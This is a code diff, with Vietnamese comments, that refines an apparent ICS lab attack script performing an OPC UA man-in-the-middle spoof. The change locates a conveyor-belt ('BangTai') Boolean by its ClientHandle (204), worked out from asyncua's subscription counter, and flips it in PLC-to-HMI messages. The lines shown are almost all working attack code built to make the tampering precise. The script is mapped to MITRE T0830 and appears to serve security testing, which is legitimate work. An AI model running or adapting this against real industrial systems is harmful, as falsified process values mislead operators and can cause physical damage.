@@ -39,13 +39,23 @@ CANH BAO THUC TE (khong phong dai) cho che do spoof:
   scapy. Neu che do spoof van treo, do la gioi han cua scapy tren Windows,
   KHONG phai do khong the sua noi dung -- hay chuyen sang pydivert de kiem chung.
 
-CANH BAO ve muc tieu byte:
-manipulate_opcua_payload() dung heuristic quet tim 1 Variant Boolean dau tien
-(khong phai bo phan tich day du). OPC UA khong lap lai ten tag trong response,
-nen khong the tim theo ten "BangTai" bang pattern byte. modified_count>0 KHONG
-dam bao dung field BangTai. Muon chinh xac: bat 1 PublishResponse that bang
-Wireshark, xac dinh offset that cua BangTai, roi hardcode (giong cach
-test_mitm_s7_spoof.py lam voi M5/M6/MD54 cho S7comm).
+DINH VI CHINH XAC BangTai (khong con la heuristic mo):
+Web-SCADA gateway (web_scada/backend/app/opcua/gateway.py) subscribe tuan tu
+tung tag theo dung thu tu trong config/opcua_tags.yaml, moi tag 1 lenh
+subscribe_data_change() rieng, await xong moi sang tag ke: vat_1, vat_2,
+vat_3, bang_tai, ... Thu vien asyncua (Subscription.__init__) luon khoi tao
+self._client_handle = 200 cho MOI Subscription moi va tang +1 truoc khi gan
+vao ClientHandle cua tung MonitoredItemCreateRequest (_make_monitored_item_
+request). => ClientHandle: vat_1=201, vat_2=202, vat_3=203, BangTai=204. Gia
+tri nay on dinh qua moi lan HMI reconnect (Subscription luon tao moi, counter
+luon reset ve 200), MIEN LA thu tu tag trong opcua_tags.yaml va vong lap
+subscribe trong gateway.py khong doi -- doi 1 trong 2 thi phai tinh lai
+BANGTAI_CLIENT_HANDLE ben duoi.
+
+manipulate_opcua_payload() tim ClientHandle=204 (4 byte LE) trong body cua
+MSG, roi doc cau truc DataValue ngay sau no (EncodingMask -> Variant TypeId
+-> gia tri Boolean) de lat DUNG field BangTai -- khong con phu thuoc vao
+"Boolean dau tien tim thay" (truoc day co the trung vat_1/vat_2/vat_3).
 
 Con quan trong: OPC UA 4840 la kenh cua WEB_SCADA (opcua_gateway poll), khong
 phai cua WinCC (WinCC dung S7CommPlus). Vay spoof gia tri se hien tren DASHBOARD
@@ -207,18 +217,39 @@ def decode_ua_header(raw: bytes) -> dict | None:
     }
 
 
-def find_boolean_variant(body: bytes):
-    """Heuristic: OPC UA Boolean Variant = TypeId byte 0x01 followed by a
-    single 0x00/0x01 value byte. NOT a full parser -- first match only,
-    may or may not be the field you actually want. See module docstring."""
-    for i in range(len(body) - 1):
-        if body[i] == 0x01 and body[i + 1] in (0x00, 0x01):
-            return i + 1
+# See module docstring: derived from opcua_tags.yaml tag order + gateway.py's
+# subscribe loop + asyncua's Subscription._client_handle counter (starts 200,
+# +1 per subscribe_data_change call). BangTai is the 4th tag => handle 204.
+BANGTAI_CLIENT_HANDLE = int(os.getenv("MITM_OPCUA_TARGET_HANDLE", "204"))
+_HANDLE_BYTES = BANGTAI_CLIENT_HANDLE.to_bytes(4, "little")
+
+
+def find_bangtai_notification(body: bytes):
+    """Locate the MonitoredItemNotification for BangTai by its ClientHandle
+    (see module docstring), then require the DataValue right after it to
+    look like a scalar Boolean (EncodingMask.Value set + Variant TypeId=1)
+    before returning the value-byte offset. A bare 4-byte coincidence
+    elsewhere in the body without that shape is skipped, not returned."""
+    start = 0
+    while True:
+        idx = body.find(_HANDLE_BYTES, start)
+        if idx == -1:
+            return None
+        value_offset = idx + 4
+        if value_offset + 1 >= len(body):
+            start = idx + 1
+            continue
+        encoding_mask = body[value_offset]
+        variant_type = body[value_offset + 1]
+        if (encoding_mask & 0x01) and variant_type == 0x01:  # Value present, Boolean scalar
+            return value_offset + 2
+        start = idx + 1
     return None
 
 
 def manipulate_opcua_payload(payload: bytes) -> bytes:
-    """Best-effort: flip the first Boolean Variant found in a MSG payload."""
+    """Flip BangTai's Boolean value byte, located via its ClientHandle (204)
+    instead of a blind first-Boolean-match scan. See module docstring."""
     global modified_count
     payload = bytearray(payload)
     header = decode_ua_header(bytes(payload))
@@ -226,14 +257,14 @@ def manipulate_opcua_payload(payload: bytes) -> bytes:
         return bytes(payload)
 
     body = payload[8:]
-    offset = find_boolean_variant(bytes(body))
+    offset = find_bangtai_notification(bytes(body))
     if offset is None:
         return bytes(payload)
 
     original = body[offset]
     body[offset] = 0x00 if original else 0x01
-    info(f"OPC UA SPOOF: Boolean byte 0x{original:02X} -> 0x{body[offset]:02X} "
-         f"(heuristic match at body offset={offset}, not guaranteed = BangTai)")
+    info(f"OPC UA SPOOF: BangTai (ClientHandle={BANGTAI_CLIENT_HANDLE}) "
+         f"0x{original:02X} -> 0x{body[offset]:02X} at body offset={offset}")
     modified_count += 1
     payload[8:] = body
     return bytes(payload)
@@ -479,7 +510,7 @@ def main():
     observable.append(f"OPC UA intercepted: {intercepted_count} pkts")
     observable.append(f"OPC UA modified   : {modified_count} pkts")
 
-    changes.append("Boolean Variant flip (heuristic, best-effort) trong 1 frame MSG PLC->HMI")
+    changes.append(f"BangTai Boolean flip (via ClientHandle={BANGTAI_CLIENT_HANDLE}) trong cac frame MSG PLC->HMI")
 
     notes.append(f"MODE       : {MODE}")
     notes.append("MITRE      : T0830 Adversary-in-the-Middle + " +
@@ -513,7 +544,8 @@ def main():
             "va TAT IP forwarding."
         )
     notes.append(
-        "modified_count>0 khong dam bao dung field BangTai (heuristic Boolean dau tien) -- xem docstring. "
+        f"modified_count>0 gio dam bao dung field BangTai (dinh vi qua ClientHandle={BANGTAI_CLIENT_HANDLE}, "
+        "khong con la Boolean dau tien tim thay) -- xem module docstring de biet cach suy ra handle nay. "
         "OPC UA 4840 la kenh web_scada, KHONG phai WinCC (S7CommPlus): spoof hien tren dashboard web-scada."
     )
     notes.append(
